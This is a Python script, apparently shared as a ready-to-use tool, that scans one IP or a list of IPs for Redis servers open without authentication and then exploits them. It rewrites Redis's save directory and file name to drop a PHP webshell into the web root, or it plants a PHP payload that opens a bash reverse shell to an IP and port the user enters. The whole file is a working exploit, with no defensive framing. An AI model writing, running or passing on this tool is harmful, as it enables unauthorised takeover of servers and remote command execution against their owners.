import argparse
import subprocess
import time

# ANSI color codes for colored output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

def run_redis_command(ip, command):
    process = subprocess.Popen(['redis-cli', '-h', ip],
                               stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               universal_newlines=True)
    output, error = process.communicate(command + '\n')
    return output, error

def check_redis_access(ip):
    print(f"{Colors.YELLOW}Checking Redis access on {ip}...{Colors.RESET}")
    output, error = run_redis_command(ip, 'info')
    if "redis_version" in output:
        print(f"{Colors.GREEN}Unauthenticated access to Redis on {ip}:\n{output}{Colors.RESET}")
        return True
    elif "-NOAUTH Authentication required" in output:
        print(f"{Colors.RED}Authentication is required for Redis on {ip}. Not vulnerable.{Colors.RESET}")
        return False
    else:
        print(f"{Colors.RED}No unauthenticated access on {ip}. Response or error:\n{output}\n{error}{Colors.RESET}")
        return False

def initiate_shell(ip):
    web_folder = input("Enter the path to the web site folder (e.g., /var/www/html): ")
    run_redis_command(ip, f'config set dir {web_folder}')
    run_redis_command(ip, 'config set dbfilename redis.php')

    choice = input("Do you want a webshell or a reverse shell? (webshell/reverse) ")
    if choice.lower() == 'webshell':
        run_redis_command(ip, 'set test "<?php system($_GET[\'cmd\']); ?>"')
        run_redis_command(ip, 'save')
        print(f"{Colors.GREEN}Webshell should now be available at http://{ip}/redis.php?cmd=<command>{Colors.RESET}")
    elif choice.lower() == 'reverse':
        user_ip = input("Enter your IP address for the reverse shell: ")
        user_port = input("Enter the port you will listen on: ")
        shell_command = f'''
set test "<?php exec(\\"/bin/bash -c 'bash -i > /dev/tcp/{user_ip}/{user_port} 0>&1'\"); ?>"
'''
        run_redis_command(ip, shell_command)
        run_redis_command(ip, 'save')
        print(f"{Colors.GREEN}Reverse shell should now be available on your listener at {user_ip}:{user_port}.{Colors.RESET}")
    else:
        print(f"{Colors.RED}Invalid choice. Skipping shell initiation.{Colors.RESET}")

def main():
    print(f"{Colors.YELLOW}Redis Vulnerability Scanner and Exploiter by 'been'{Colors.RESET}")
    print(f"{Colors.GREEN}--------------------------------------------{Colors.RESET}")
    print(f"{Colors.GREEN}This tool checks for unauthenticated Redis access and allows shell deployment.{Colors.RESET}")
    print(f"{Colors.GREEN}--------------------------------------------{Colors.RESET}")
    time.sleep(5)

    parser = argparse.ArgumentParser(description="Check for unauthenticated Redis access.")
    parser.add_argument("--ip", help="Single IP address to check.")
    parser.add_argument("--file", help="File containing IP addresses, one per line.")
    args = parser.parse_args()

    targets = []
    unauthenticated_ips = []

    if args.ip:
        targets.append(args.ip)
    elif args.file:
        try:
            with open(args.file, 'r') as file:
                targets = [line.strip() for line in file.readlines()]
            print(f"{Colors.YELLOW}Loaded {len(targets)} IPs from file.{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
            return

    if not targets:
        print(f"{Colors.RED}No target IP or file provided.{Colors.RESET}")
        return

    for ip in targets:
        print(f"{Colors.YELLOW}Processing IP: {ip}{Colors.RESET}")
        if check_redis_access(ip):
            unauthenticated_ips.append(ip)
            response = input(f"Do you want to initiate a shell on {ip}? (y/n/skip) ")
            if response.lower() == 'y':
                initiate_shell(ip)
            elif response.lower() == 'skip':
                print(f"{Colors.YELLOW}Skipping {ip} and moving to next IP (if any).{Colors.RESET}")
                continue
            else:
                print(f"{Colors.YELLOW}Skipping shell initiation on {ip}.{Colors.RESET}")

        if ip != targets[-1]:
            continue_response = input("Do you want to continue to the next IP? (y/n) ")
            if continue_response.lower() != 'y':
                print(f"{Colors.GREEN}Exiting script.{Colors.RESET}")
                break

    if unauthenticated_ips:
        print(f"{Colors.YELLOW}Unauthenticated IPs:{Colors.RESET}")
        for ip in unauthenticated_ips:
            print(f"{Colors.GREEN}{ip}{Colors.RESET}")
        while True:
            select_ip = input("Enter an IP to initiate shell or type 'exit' to finish: ")
            if select_ip.lower() == 'exit':
                break
            elif select_ip in unauthenticated_ips:
                initiate_shell(select_ip)
            else:
                print(f"{Colors.RED}Invalid IP or IP not in unauthenticated list.{Colors.RESET}")

    print(f"{Colors.GREEN}Finished processing all IPs.{Colors.RESET}")

if __name__ == "__main__":
    main()
